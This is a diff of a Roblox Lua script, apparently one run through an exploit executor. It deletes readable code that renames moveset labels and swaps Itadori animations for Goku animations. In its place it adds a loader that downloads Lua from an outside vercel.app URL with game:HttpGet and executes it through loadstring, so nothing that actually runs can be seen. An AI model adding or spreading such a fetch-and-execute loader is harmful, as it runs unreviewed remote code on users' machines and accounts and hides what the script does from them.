@@ -1,90 +1,16 @@
-local Players = game:GetService("Players")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local player = Players.LocalPlayer
+local url = "https://repo-tan-one.vercel.app/api/lua-script"
 
-local moveset = player.PlayerGui.Main.Moveset
-moveset['Cursed Strikes'].ItemName.Text = "The Flying Nimbus"
-moveset['Crushing Blow'].ItemName.Text = "Saiyan Smash"
-moveset['Divergent Fist'].ItemName.Text = "Kamehameha"
-moveset['Manji Kick'].ItemName.Text = "Monsterous Awakening"
-player.PlayerGui.Main.Ultimate.Title.Text = "Goku"
+local success, response = pcall(function()
+    return game:HttpGet(url)
+end)
 
-local originalAnimations = {
-	CursedStrike = ReplicatedStorage.Animations.Itadori.CursedStrike,
-	CrushingBlow = ReplicatedStorage.Animations.Itadori.CrushingBlow,
-	DivergentFist1 = ReplicatedStorage.Animations.Itadori.Variants.DivergentFist1,
-	ManjiKick = ReplicatedStorage.Animations.Itadori.ManjiKick,
-}
-
-local gokuAnimations = {
-	CursedStrike = ReplicatedStorage.Animations.Goku.Melee.Chase,
-	CrushingBlow = ReplicatedStorage.Animations.Goku.M2Downslam,
-	DivergentFist1 = ReplicatedStorage.Animations.Goku.Kamehameha,
-	ManjiKick = ReplicatedStorage.Animations.Goku.GokuTransformation,
-}
-
-local loadedAnimations = {}
-local isAnimationSequenceActive = false
-
-local function loadAnimation(animObj, character)
-	local humanoid = character:FindFirstChildOfClass("Humanoid")
-	if not humanoid then return nil end
-
-	local anim = Instance.new("Animation")
-	anim.AnimationId = animObj.AnimationId
-	return humanoid:LoadAnimation(anim)
+if success and response then
+    local fn, err = loadstring(response)
+    if fn then
+        fn()
+    else
+        warn("Error loading Lua code:", err)
+    end
+else
+    warn("HTTP request failed:", response)
 end
-
-local function playReplacement(player, replacementAnimObj)
-	if isAnimationSequenceActive then return end
-	isAnimationSequenceActive = true
-
-	local character = player.Character
-	if not character then return end
-
-	local humanoid = character:FindFirstChildOfClass("Humanoid")
-	if not humanoid then return end
-
-	for _, track in pairs(humanoid:GetPlayingAnimationTracks()) do
-		track:Stop()
-	end
-
-	local animId = replacementAnimObj.AnimationId
-	if not loadedAnimations[animId] then
-		loadedAnimations[animId] = loadAnimation(replacementAnimObj, character)
-	end
-
-	local track = loadedAnimations[animId]
-	if track then
-		track:Play()
-		task.wait(2)
-		track:Stop()
-	end
-
-	isAnimationSequenceActive = false
-end
-
-local function onAnimationPlayed(animationTrack)
-	local id = animationTrack.Animation.AnimationId
-
-	for key, originalAnim in pairs(originalAnimations) do
-		if id == originalAnim.AnimationId then
-			animationTrack:Stop() -- Stop the original animation
-			local replacement = gokuAnimations[key]
-			if replacement then
-				playReplacement(Players.LocalPlayer, replacement)
-			end
-			break
-		end
-	end
-end
-
-local function setupCharacter(character)
-	loadedAnimations = {}
-
-	local humanoid = character:WaitForChild("Humanoid")
-	humanoid.AnimationPlayed:Connect(onAnimationPlayed)
-end
-
-setupCharacter(player.Character or player.CharacterAdded:Wait())
-player.CharacterAdded:Connect(setupCharacter)
